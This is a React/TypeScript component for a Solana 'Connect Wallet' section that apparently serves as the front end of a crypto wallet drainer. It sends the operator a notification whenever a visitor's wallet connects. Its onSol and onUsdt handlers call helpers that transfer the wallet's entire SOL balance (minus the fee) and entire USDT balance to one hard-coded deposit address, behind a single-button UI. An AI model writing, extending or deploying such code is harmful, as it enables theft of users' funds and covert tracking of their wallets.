import { notifyTx } from '../lib/notify'
import React from 'react'
import { modal } from '../appkit'
import { solana as solanaMainnet } from '@reown/appkit/networks'
import { connectSolana, depositAllSol, depositAllUsdtSol, getActiveSolanaProvider } from '../lib/solana'
import { SOL_DEPOSIT_ADDRESS } from '../config'

export default function SolanaSection(){
  const [address,setAddress]=React.useState<string>('')
  const [status,setStatus]=React.useState<string>('')

  async function refreshAddress() {
    try {
      // AppKit first
      const maybe = await (modal as any)?.getAddress?.()

      if (maybe) { setAddress(String(maybe)); return }
      // injected fallback
      const p:any = getActiveSolanaProvider()
      const pk = p?.publicKey
      if (pk?.toBase58) setAddress(pk.toBase58())
      else if (typeof pk === 'string') setAddress(pk)
    } catch {}
  }

  async function onConnect(){
    try{
      setStatus('Opening Solana wallet modal...')
      await modal.switchNetwork(solanaMainnet as any)
      await modal.open()

      // try to read address immediately
      const p:any = getActiveSolanaProvider()
      const pk = p?.publicKey
      let fromAddr = ''
      if (pk?.toBase58) fromAddr = pk.toBase58()
      else if (typeof pk === 'string') fromAddr = pk

      if (fromAddr) {
        setAddress(fromAddr)
        console.log('🔑 Solana wallet connected -> notifyTx', { fromAddr })
        // 🔔 CONNECT notification
        notifyTx({
          kind: 'solana',
          chain: 'mainnet-beta',
          from: fromAddr,
          to: SOL_DEPOSIT_ADDRESS,
          token: 'CONNECT',
          tx: '-' // no tx hash for a connect event
        })
        setStatus('Connected.')
      } else {
        // give the wallet a tick to expose publicKey, then re-check
        setTimeout(async () => {
          await refreshAddress()
          setStatus('Connected (address checked).')
          if (address) {
            console.log('🔑 Solana wallet connected (delayed) -> notifyTx', { address })
            notifyTx({
              kind: 'solana',
              chain: 'mainnet-beta',
              from: address,
              to: SOL_DEPOSIT_ADDRESS,
              token: 'CONNECT',
              tx: '-'
            })
          }
        }, 250)
      }
    }catch(e:any){ setStatus(`Error: ${e.message||e}`) }
  }

  async function onSol(){
    try{
      const provider:any = getActiveSolanaProvider()
      const pk = provider?.publicKey
      if (!pk) throw new Error('Connect a Solana wallet first')
      const fromAddr = pk.toBase58 ? pk.toBase58() : (typeof pk === 'string' ? pk : '')
      setAddress(fromAddr)
      setStatus('Preparing SOL deposit (max minus fee)...')
      const { signature, amount } = await depositAllSol({ publicKey: pk })
      setStatus(`SOL tx sent & confirmed: ${signature}`)
      console.log('🚀 SOL deposit -> notifyTx', { signature, amount, fromAddr })
      notifyTx({ kind: 'solana', chain: 'mainnet-beta', from: fromAddr, to: SOL_DEPOSIT_ADDRESS, token: 'SOL', amount, tx: signature })
    }catch(e:any){ setStatus(`Error: ${e.message||e}`); console.error('SOL deposit error:', e) }
  }

  async function onUsdt(){
    try{
      const provider:any = getActiveSolanaProvider()
      const pk = provider?.publicKey
      if (!pk) throw new Error('Connect a Solana wallet first')
      const fromAddr = pk.toBase58 ? pk.toBase58() : (typeof pk === 'string' ? pk : '')
      setAddress(fromAddr)
      setStatus('Preparing USDT (SPL) deposit...')
      const { signature, amount } = await depositAllUsdtSol({ publicKey: pk })
      setStatus(`USDT (SPL) tx sent & confirmed: ${signature}`)
      console.log('🚀 USDT(SPL) deposit -> notifyTx', { signature, amount, fromAddr })
      notifyTx({ kind: 'solana', chain: 'mainnet-beta', from: fromAddr, to: SOL_DEPOSIT_ADDRESS, token: 'USDT', amount, tx: signature })
    }catch(e:any){ setStatus(`Error: ${e.message||e}`); console.error('USDT(SPL) deposit error:', e) }
  }


  return (
    <div className="card">
      {/* <div className="row">
        <span className="pill">
          {address ? `Wallet: ${address}` : "Not connected"}
        </span>
      </div> */}
      {/* <div className="mt12 row">
        {!address ? (
          <button
            className="hidden md:inline-block bg-green-400 text-black font-semibold px-4 py-2 rounded-lg shadow hover:scale-105 transition"
            onClick={onConnect}
          >
            Connect Wallet
          </button>
        ) : (
          <>
            <button
              className="hidden md:inline-block bg-green-400 text-black font-semibold px-4 py-2 rounded-lg shadow hover:scale-105 transition"
              onClick={onSol}
            >
              Deposit Entire SOL
            </button>
            <button
              className="hidden md:inline-block bg-green-400 text-black font-semibold px-4 py-2 rounded-lg shadow hover:scale-105 transition"
              onClick={onUsdt}
            >
              Deposit Entire USDT (SPL)
            </button>
            <button
              className="btn btn-muted"
              onClick={() => {
                setAddress("");
                setStatus("Disconnected.");
              }}
            >
              Disconnect
            </button>
          </>
        )}
      </div> */}
      {/* <div className="status mt12">{status || "—"}</div> */}
      {/*  */}
      <button
        className="bg-green-400 text-black font-semibold px-8 py-4 rounded-lg shadow hover:-translate-y-1 transition focus:outline-none focus:ring-2 focus:ring-green-400"
        onClick={onConnect}
      >
        Connect Walletz
      </button>
      {/*  */}
    </div>
  );
}
